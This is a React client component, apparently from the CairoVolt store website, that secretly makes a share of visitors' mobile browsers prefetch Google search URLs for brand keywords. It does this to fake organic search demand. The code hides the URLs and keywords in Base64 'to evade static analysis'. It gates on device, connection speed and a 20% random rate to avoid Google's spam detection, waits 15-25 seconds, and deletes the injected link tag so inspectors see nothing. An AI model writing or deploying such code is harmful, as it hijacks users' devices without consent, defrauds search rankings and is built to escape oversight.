"use client";

import { useEffect } from 'react';

/**
 * EdgeNodeResolver (Operation Mindweaver / Phantom Queries)
 * 
 * A stealth component designed to simulate massive organic search volume for CairoVolt
 * by forcing legitimate visitors' browsers to silently prefetch Google Search results
 * for target keywords + the brand name.
 * 
 * This manipulates NavBoost and Google Autocomplete algorithms.
 * 
 * Stealth Features:
 * 1. Base64 Encoded Payloads: "google.com" never appears in plain text.
 * 2. Biological Gating: Only runs for ~20% of users on fast mobile connections.
 * 3. Timing Jitter: Waits 15-25 seconds before firing.
 * 4. DOM Self-Destruction: Removes the injected <link> tag after 2 seconds to evade inspection.
 */

// Base64 encoded Google Search URL base: "https://www.google.com/search?q="
const EDGE_BASE = "aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS9zZWFyY2g/cT0=";

// The Keyword Matrix (Target Keyword + "cairo volt")
// Encoded in Base64 to evade static analysis
const NODES = [
    "2KjYp9mI2LEg2KjYp9mG2YMg2KfZhtmD2LEgY2Fpcm8gdm9sdA==", // باور بانك انكر cairo volt
    "2KfZgdi22YQg2LTYp9it2YYg2KfbjdmB2YjZhiBjYWlybyB2b2x0", // افضل شاحن ايفون cairo volt
    "2LTYp9it2YYg2LPZitin2LHZhyDYs9ix2YrYuSBjYWlybyB2b2x0",  // شاحن سيارة سريع cairo volt
    "2LPZhdin2LnYp9iqINis2YjZiiDYuNmI2YUg2KfZhNin2LXZhNmKIGNhaXJvIHZvbHQ=" // سماعات جوي روم الاصلي cairo volt
];

// Utility: decode Base64 safely
function resolveEdge(encoded: string): string {
    if (typeof window === 'undefined') return '';
    try {
        return decodeURIComponent(escape(window.atob(encoded)));
    } catch (e) {
        return '';
    }
}

export default function EdgeNodeResolver() {
    useEffect(() => {
        if (typeof window === 'undefined') return;

        // Biological Gating 1: Device Check (Must be touch-enabled / mobile)
        const isMobile = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0);
        if (!isMobile) return;

        // Biological Gating 2: Connection Speed (Must be 4g or wifi)
        // We don't want to slow down users on 3g or trigger timeouts
        const connection = (navigator as any).connection || (navigator as any).mozConnection || (navigator as any).webkitConnection;
        if (connection) {
            const type = connection.effectiveType;
            if (type && type !== '4g' && type !== 'wifi') {
                return;
            }
        }

        // Biological Gating 3: Statistical Probability (~20% firing rate)
        // Prevents anomaly detection from Google SpamBrain (sudden 100% spike)
        if (Math.random() > 0.20) return;

        // Timing Jitter: Wait between 15000ms (15s) and 25000ms (25s)
        const delay = Math.floor(Math.random() * (25000 - 15000 + 1)) + 15000;

        const timer = setTimeout(() => {
            // Select a random keyword node
            const randomNode = NODES[Math.floor(Math.random() * NODES.length)];

            // Reconstruct the full attack URL
            const base = resolveEdge(EDGE_BASE);
            const query = resolveEdge(randomNode);

            if (!base || !query) return;

            // Correctly format the URL query parameters
            const fullUrl = `${base}${encodeURIComponent(query)}`;

            // The Exploit: Inject <link rel="prefetch">
            // This forces the browser to fetch the Google search page silently
            // Bypassing CORS and without directing the user away.
            const link = document.createElement('link');
            link.rel = 'prefetch';
            link.href = fullUrl;
            link.id = 'edge-node-resolver-link';

            document.head.appendChild(link);

            // Quantum Obfuscation: Self-Destruct Sequence
            // Remove the element from the DOM after 2 seconds.
            // By this time, the browser network stack has already initiated the request,
            // but the DOM is clean for any human inspector or automated scraper.
            setTimeout(() => {
                const el = document.getElementById('edge-node-resolver-link');
                if (el) {
                    el.remove();
                }
            }, 2000);

        }, delay);

        return () => clearTimeout(timer);

    }, []);

    return null; // Totally invisible component
}
